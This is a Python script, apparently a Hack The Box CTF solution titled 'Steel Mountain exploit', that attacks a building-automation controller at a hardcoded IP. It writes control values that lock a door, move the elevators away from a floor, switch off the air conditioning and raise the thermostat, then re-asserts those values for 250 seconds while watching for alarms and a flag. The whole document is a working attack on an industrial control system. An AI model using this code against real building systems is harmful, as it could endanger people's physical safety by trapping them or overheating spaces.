import socket
import time
import json
import urllib.request
import re
import sys

HOST = "154.57.164.73"
BP = 31900
WP = 32494

def bw(ot, oid, p, v):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((HOST, BP))
        s.recv(4096)
        s.sendall(b"3\n")
        time.sleep(0.08)
        s.recv(4096)
        s.sendall(f"{ot} {oid} {p} {v}\n".encode())
        time.sleep(0.08)
        r = s.recv(4096).decode()
        s.close()
        return "True" in r
    except:
        return False

def gd():
    try:
        req = urllib.request.urlopen(f"http://{HOST}:{WP}/data", timeout=3)
        return json.loads(req.read().decode())
    except:
        return {}

def enforce():
    bw("analogOutput", 23, "presentValue", 99)
    bw("multiStateOutput", 102, "presentValue", 2)
    bw("binaryOutput", 22, "presentValue", 0)
    bw("analogOutput", 21, "presentValue", 32)
    bw("analogOutput", 82, "presentValue", 3)
    bw("analogOutput", 85, "presentValue", 1)

print("=== STEEL MOUNTAIN EXPLOIT ===")

# PASO 0: OHAP alto PRIMERO
print("[0] OHAP->99:", bw("analogOutput", 23, "presentValue", 99))
time.sleep(0.3)

# PASO 1: Bloquear puerta
print("[1] Door->2:", bw("multiStateOutput", 102, "presentValue", 2))
time.sleep(0.3)

# PASO 2: Elevadores fuera nivel 2
print("[2] ELE1->3:", bw("analogOutput", 82, "presentValue", 3))
print("[2] ELE2->1:", bw("analogOutput", 85, "presentValue", 1))
time.sleep(0.3)

# PASO 3: Temp 32
print("[3] AC->OFF:", bw("binaryOutput", 22, "presentValue", 0))
print("[3] Th->32:", bw("analogOutput", 21, "presentValue", 32))

time.sleep(2)
d = gd()
print(f"\nPost-config: T={d.get('Temp-L2-20',{}).get('presentValue','?')} D={d.get('L2-TSR-DR',{}).get('presentValue','?')} OHAP={d.get('OHAP-L2-23',{}).get('presentValue','?')} AC={d.get('ACS-L2-22',{}).get('presentValue','?')} Al={d.get('OHA-L2-24',{}).get('presentValue','?')}")

# PASO 4: Mantener 250s
print("\n[4] Manteniendo 250s...")
start = time.time()
found = False

while time.time() - start < 250 and not found:
    el = int(time.time() - start)
    enforce()
    
    if el % 10 == 0:
        d = gd()
        if d:
            t = d.get('Temp-L2-20',{}).get('presentValue',0)
            al = d.get('OHA-L2-24',{}).get('presentValue',0)
            mp = d.get('Message',{}).get('presentValue',0)
            md = d.get('Message',{}).get('Description','')
            dr = d.get('L2-TSR-DR',{}).get('presentValue',0)
            ac = d.get('ACS-L2-22',{}).get('presentValue',0)
            e1 = d.get('ELE-1-TF',{}).get('presentValue','?')
            e2 = d.get('ELE-2-TF',{}).get('presentValue','?')
            
            print(f"  [{el:3d}s] T={t} D={dr} AC={ac} Al={al} E1={e1} E2={e2} M={mp}'{md[:50]}'")
            
            if al == 1:
                print(f"  ALARMA!")
                time.sleep(12)
                enforce()
                continue
            
            full = json.dumps(d)
            if 'HTB{' in full:
                flags = re.findall(r'HTB\{[^}]+\}', full)
                print(f"\nFLAG: {flags[0]}")
                found = True
                break
            
            if md and 'alarm' not in md.lower() and md.strip():
                print(f"\nMSG: '{md}'")
                if 'HTB' in md:
                    found = True
                    break
    
    time.sleep(0.3)

if not found:
    d = gd()
    print(f"\nFinal Message: {d.get('Message',{})}")
    try:
        req = urllib.request.urlopen(f"http://{HOST}:{WP}/", timeout=5)
        html = req.read().decode()
        flags = re.findall(r'HTB\{[^}]+\}', html)
        if flags: print(f"FLAG HTML: {flags[0]}")
    except: pass

print("\nDone.")
